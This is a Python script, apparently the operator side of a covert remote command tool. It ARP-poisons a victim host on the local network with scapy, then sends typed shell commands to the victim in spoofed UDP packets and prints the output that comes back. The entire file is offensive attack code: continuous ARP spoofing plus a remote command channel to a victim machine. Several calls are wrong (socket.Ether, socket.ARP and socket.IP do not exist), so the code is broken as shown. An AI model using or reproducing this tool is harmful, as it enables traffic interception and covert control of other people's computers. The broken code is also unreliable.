import sys
import socket
from socket import *
import threading
import time
from logging import getLogger, ERROR
import argparse
 
# reverse shell using ARP
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument("--ip", "-ip", type=str, required=True)
parser.add_argument("--spoof", "-s", type=str, required=True)
parser.add_argument("--interface", "-i", type=str, required=True)
args = parser.parse_args()

vic_ip = args.ip
spoof = args.spoof
interface = args.interface
 
conf.verb = 0
 
def getMAC():
    try:
        pkt = srp(socket.Ether(dst = "ff:ff:ff:ff:ff:ff")/socket.ARP(pdst = vic_ip), timeout = 2, iface = interface, inter = 0.1)
    except Exception:
        print('error: failed to get mac address')
        sys.exit(1)
    for snd, rcv in pkt[0]:
        return rcv.sprintf(r"%Ether.src%")
print('\n got victim mac address ')
victimMAC = getMAC()
 
 
spoofStatus = True
def poison():
    while 1:
        if spoofStatus == False:
            break
            return
        send(socket.ARP(op=2, pdst=vic_ip, psrc=spoof, hwdst=victimMAC))
        time.sleep(5)
 
print('\n starting thread for poisoning')
thread = []
try:
    poisonerThread = threading.Thread(target=poison)
    thread.append(poisonerThread)
    poisonerThread.start()
    print('started!\n')
except Exception:
    print('failed to start')
    sys.exit(1)
 
print('starting connection with victim')
pkt1 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='hello victim'))
pkt2 = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load='report'))
 
prompt = pkt2.getlayer(Raw).load
 
print('connected with victim\n')
print('enter goodbye to exit\n')
 
while 1:
    command = input(prompt)
    sendcom = sr1(socket.IP(dst=vic_ip, src=spoof)/socket.UDP(sport=80, dport=80)/Raw(load=command))
    output = sendcom.getlayer(Raw).load
    if command.strip() == 'goodbye':
        spoofStatus = False
        poisonerThread.join()
        sys.exit(1)
    print(output)